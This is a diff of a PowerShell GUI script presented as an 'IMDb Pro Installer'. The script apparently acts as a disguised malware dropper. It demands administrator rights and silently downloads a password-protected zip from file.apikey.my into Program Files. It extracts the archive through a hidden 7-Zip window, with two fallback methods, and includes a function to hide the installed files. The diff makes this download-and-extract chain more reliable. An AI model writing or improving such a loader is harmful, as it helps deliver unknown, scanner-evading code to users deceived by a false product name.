@@ -1,4 +1,4 @@
-# IMDb Pro Installer - Silent PowerShell Version
+# IMDb Pro Installer - Fixed Silent Version
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -317,7 +317,7 @@ function Update-Status {
     Start-Sleep -Milliseconds 400
 }
 
-# SILENT: Direct Download and Extract function (no console output)
+# FIXED: Simple Download and Extract function
 function Download-AndExtract-Direct {
     param(
         [string]$Url,
@@ -332,84 +332,110 @@ function Download-AndExtract-Direct {
         }
         
         # Download file
-        Update-Status "Downloading package..." 0 "📥"
+        Update-Status "Downloading package..." 40 "📥"
         
-        $tempZip = "$env:TEMP\imdb_direct_$(Get-Random).zip"
+        $tempZip = "$env:TEMP\imdb_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
         
-        # Download using WebClient (silent)
+        # Download using WebClient with timeout
         $webClient = New-Object System.Net.WebClient
         $webClient.DownloadFile($Url, $tempZip)
         
-        if (-not (Test-Path $tempZip)) {
-            throw "Download failed"
+        if (-not (Test-Path $tempZip) -or (Get-Item $tempZip).Length -eq 0) {
+            throw "Download failed or file is empty"
         }
         
-        $fileSize = (Get-Item $tempZip).Length
+        Update-Status "Extracting files..." 60 "📦"
         
-        if ($fileSize -eq 0) {
-            throw "Downloaded file is empty"
-        }
+        # Try multiple extraction methods
+        $success = $false
         
-        # Use 7-Zip with proper path handling
-        $7zipPath = Test-7ZipAvailable
-        if ($7zipPath) {
-            Update-Status "Extracting with 7-Zip..." 0 "📦"
-            
-            # Proper argument formatting for paths with spaces
-            $arguments = @(
-                "x",                    # Extract
-                "-p$Password",          # Password
-                "-o`"$Destination`"",  # Quoted output path
-                "-y",                   # Yes to all
-                "`"$tempZip`""          # Quoted input path
-            )
-            
-            # Execute 7-Zip silently
-            $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow -WindowStyle Hidden
-            
-            if ($process.ExitCode -eq 0) {
-                # Verify extraction
-                $extractedItems = Get-ChildItem $Destination -Recurse
-                if ($extractedItems.Count -gt 0) {
-                    Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
-                    return $true
-                } else {
-                    throw "Extraction completed but no files found"
+        # Method 1: Try 7-Zip first
+        $7zipPath = Get-7ZipPath
+        if ($7zipPath -and (Test-Path $7zipPath)) {
+            try {
+                $arguments = @(
+                    "x",
+                    "-p$Password", 
+                    "-o`"$Destination`"",
+                    "-y",
+                    "`"$tempZip`""
+                )
+                
+                $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow -WindowStyle Hidden
+                if ($process.ExitCode -eq 0) {
+                    $success = $true
                 }
-            } else {
-                throw "7-Zip extraction failed"
             }
-        } else {
-            throw "7-Zip not available"
+            catch {
+                # Continue to next method
+            }
         }
         
-        return $false
-    }
-    catch {
-        throw $_.Exception.Message
-    }
-    finally {
+        # Method 2: Try Expand-Archive if 7-Zip failed
+        if (-not $success) {
+            try {
+                # Create temp folder for extraction
+                $tempExtract = "$env:TEMP\imdb_extract_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+                New-Item -ItemType Directory -Path $tempExtract -Force | Out-Null
+                
+                # Extract using Expand-Archive
+                Expand-Archive -Path $tempZip -DestinationPath $tempExtract -Force
+                
+                # Move files to destination
+                Get-ChildItem $tempExtract -Recurse | Copy-Item -Destination $Destination -Recurse -Force
+                
+                # Cleanup temp extract
+                Remove-Item $tempExtract -Recurse -Force -ErrorAction SilentlyContinue
+                $success = $true
+            }
+            catch {
+                # Continue to next method
+            }
+        }
+        
+        # Method 3: Try .NET extraction
+        if (-not $success) {
+            try {
+                Add-Type -AssemblyName System.IO.Compression.FileSystem
+                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $Destination)
+                $success = $true
+            }
+            catch {
+                # Method failed
+            }
+        }
+        
         # Cleanup temp file
         if (Test-Path $tempZip) {
             Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
         }
+        
+        if (-not $success) {
+            throw "All extraction methods failed"
+        }
+        
+        return $true
+    }
+    catch {
+        # Cleanup on error
+        if (Test-Path $tempZip) {
+            Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+        }
+        throw $_.Exception.Message
     }
 }
 
-function Test-7ZipAvailable {
-    $locations = @(
-        "7z",
-        "7z.exe", 
+function Get-7ZipPath {
+    $paths = @(
+        "7z.exe",
         "$env:ProgramFiles\7-Zip\7z.exe",
-        "${env:ProgramFiles(x86)}\7-Zip\7z.exe"
+        "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
+        "$env:ChocolateyInstall\tools\7z.exe"
     )
     
-    foreach ($location in $locations) {
-        if (Get-Command $location -ErrorAction SilentlyContinue) {
-            return $location
-        }
-        if (Test-Path $location) {
-            return $location
+    foreach ($path in $paths) {
+        if (Test-Path $path) {
+            return $path
         }
     }
     return $null
@@ -434,7 +460,7 @@ function Hide-Files {
     }
 }
 
-# SILENT: Enhanced Installation function
+# FIXED: Enhanced Installation function
 function Start-Installation {
     $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
     $installPath = "C:\Program Files\imdb-pro"
@@ -446,34 +472,32 @@ function Start-Installation {
         
         # Admin check
         if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-            Update-Status "Administrator privileges required" 0 "❌"
-            [System.Windows.Forms.MessageBox]::Show(
-                "Please run this installer as Administrator.", 
-                "Elevation Required", 
-                [System.Windows.Forms.MessageBoxButtons]::OK, 
-                [System.Windows.Forms.MessageBoxIcon]::Warning
-            )
-            $installButton.Enabled = $true
-            $installButton.Text = "🚀 START INSTALLATION"
-            return
+            throw "Administrator privileges required"
         }
         
         # Phase 2: Create directory
         Update-Status "Creating installation directory..." 20 "📁" -AnimateProgress
-        if (!(Test-Path $installPath)) {
-            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
-        } else {
+        
+        # Clean existing directory
+        if (Test-Path $installPath) {
             Remove-Item "$installPath\*" -Recurse -Force -ErrorAction SilentlyContinue
+        } else {
+            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
         }
         
-        # Phase 3: Direct Download & Extract
-        Update-Status "Downloading and extracting directly..." 40 "🚀" -Loading
+        # Phase 3: Download & Extract
+        Update-Status "Starting download..." 30 "🌐" -Loading
         
-        # Use direct download and extract method
         $success = Download-AndExtract-Direct -Url $downloadUrl -Destination $installPath -Password $zipPassword
         
         if (-not $success) {
             throw "Download and extraction failed"
+        }
+        
+        # Verify extraction
+        $extractedItems = Get-ChildItem $installPath -Recurse
+        if ($extractedItems.Count -eq 0) {
+            throw "No files were extracted"
         }
         
         Update-Status "Download and extraction completed!" 80 "✅" -AnimateProgress
@@ -513,7 +537,7 @@ function Start-Installation {
         $result = [System.Windows.Forms.MessageBox]::Show(
             "🎬 IMDb Pro has been successfully installed!`n`n" +
             "📍 Location: $installPath`n" +
-            "🔒 Files secured and hidden`n`n" +
+            "📁 Files extracted and secured`n`n" +
             "Would you like to open the installation folder now?",
             "Installation Complete",
             [System.Windows.Forms.MessageBoxButtons]::YesNo,
@@ -526,15 +550,8 @@ function Start-Installation {
         
     }
     catch {
-        # Error animation
-        for ($i = 0; $i -lt 3; $i++) {
-            Update-Status "Installation failed!" 0 "💥"
-            Start-Sleep -Milliseconds 200
-            Update-Status "Installation failed!" 0 "❌"
-            Start-Sleep -Milliseconds 200
-        }
-        
-        Update-Status "Error: Installation failed" 0 "🚫"
+        # Error handling
+        Update-Status "Installation failed!" 0 "❌"
         
         $installButton.Text = "🔄 TRY AGAIN"
         $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
@@ -542,12 +559,8 @@ function Start-Installation {
         
         [System.Windows.Forms.MessageBox]::Show(
             "Installation failed!`n`n" +
-            "Possible reasons:`n" +
-            "• No internet connection`n" +
-            "• No administrator rights`n" +
-            "• 7-Zip not installed`n" +
-            "• Insufficient disk space`n`n" +
-            "Please try again.",
+            "Error: $($_.Exception.Message)`n`n" +
+            "Please check your internet connection and try again.",
             "Installation Error",
             [System.Windows.Forms.MessageBoxButtons]::OK,
             [System.Windows.Forms.MessageBoxIcon]::Error
